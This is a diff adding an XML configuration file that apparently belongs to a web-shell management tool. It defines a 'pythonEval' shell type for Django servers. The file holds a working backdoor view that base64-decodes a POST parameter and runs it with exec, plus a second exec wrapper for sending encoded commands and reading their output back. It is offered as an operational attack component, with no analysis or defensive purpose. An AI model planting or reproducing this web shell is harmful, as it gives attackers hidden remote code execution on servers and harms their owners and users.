@@ -1,0 +1,24 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <basicSetting>
+    <name>pythonEval</name>
+    <serviceExample><![CDATA[from django.http import HttpResponse
+import sys,StringIO,base64
+def one(request):
+	res = ''
+	exec str(base64.b64decode(request.POST.get('a')))
+	return HttpResponse(res)]]></serviceExample>
+	<mainCodeParam location="Body" encrymode="Base64" >passwd</mainCodeParam>
+  </basicSetting>
+  <mainCodeSetting>
+	<funcCodeParam location="Body" encrymode="Base64" >funcCode</funcCodeParam>
+	<item><![CDATA[import base64
+try:
+	res+='->|'
+	exec base64.b64decode(request.POST.get('$funcCode$'))
+except Exception,e:
+	res+='ERROR://'+str(e)
+finally:
+	res+='|<-']]></item>
+  </mainCodeSetting>
+</customShellType>
